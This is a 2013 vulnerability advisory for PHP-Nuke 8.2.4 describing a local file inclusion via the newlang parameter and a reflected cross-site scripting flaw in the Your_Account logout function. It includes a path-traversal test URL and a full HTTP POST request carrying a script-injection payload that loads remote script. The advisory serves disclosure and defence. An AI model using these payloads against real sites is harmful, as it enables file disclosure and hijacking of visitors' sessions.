@@ -1,0 +1,95 @@
+[SOJOBO-ADV-13-04] - PHP-Nuke 8.2.4 multiple vulnerabilities
+
+
+I. * Information *
+==================
+Name : PHP-Nuke 8.2.4 multiple vulnerabilities
+Software : PHP-Nuke 8.2.4 and possibly below.
+Vendor Homepage : http://www.phpnuke.org/
+Vulnerability Type : File Inclusion and Reflected Cross-Site Scripting
+Severity : High (4/5)
+Advisory Reference : SOJOBO-ADV-13-04 (http://www.enkomio.com/Advisories)
+Credits: Sojobo dev team
+Description: A File Inclusion and Reflected Cross Site Scripting vulnerability was discovered during the testing of Sojobo, Static Analysis Tool.
+
+
+II. * Details *
+===============
+A) File Inclusion in mainfile.php [Impact: 4/5]
+
+
+Follow a trace to reach the vulnerable code.
+
+
+File: /html/index.php
+15: require_once("mainfile.php");
+
+
+File: /html/mainfile.php
+90: if (!ini_get('register_globals')) { 
+91:  @import_request_variables("GPC", "");
+...
+274: if ((isset($newlang)) AND (stristr($newlang,"."))) {
+275:  if (file_exists("language/lang-".$newlang.".php")) {
+...
+277:   include_once("language/lang-".$newlang.".php");
+
+
+due to a call to the function 'import_request_variables' it is possible to create the variable $newlang with an arbitrary value and to allow the inclusion of an arbitrary local file.
+
+
+A test request is: /index.php?newlang=/../../index
+
+
+B) Reflected Cross Site Scripting in index.php (of module Your_Account) [Impact: 3/5]
+
+
+Follow a trace to reach the vulnerable code.
+
+
+File: /html/mainfile.php
+90: if (!ini_get('register_globals')) { 
+91:  @import_request_variables("GPC", "");
+
+
+File: /html/modules/Your_Account/index.php
+758: function logout() {
+769: if (!empty($redirect)) {
+770: echo "<META HTTP-EQUIV=\"refresh\" content=\"3;URL=modules.php?name=$redirect\">";
+
+
+due to a call to the function 'import_request_variables' it is possible to create the variable $redirect with an arbitrary value and to inject arbitrary HTML code. Due to 
+XSS filtering the request must be done via POST with the injection data sent as payload.
+
+
+A HTTP POST test request is: 
+
+
+POST /html/modules.php?name=Your_Account&op=logout HTTP/1.1
+Host: www.example.com
+User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:25.0) Gecko/20100101 Firefox/25.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Referer: http://www.example.com/html/index.php
+Cookie: lang=english;
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 59
+
+
+redirect="><script src="http://www.example.com/xss.html" />
+
+
+III. * Report Timeline *
+========================
+
+
+18 November 2013 - Advisory released, unable to contact the vendor.
+
+
+IV. * About Sojobo *
+====================
+Sojobo allows you to find security vulnerabilities in your PHP web application source code before others do.
+By using the state of the art techniques Sojobo is able to identify the most critical vulnerabilities in your code 
+and limit the number of false positives.
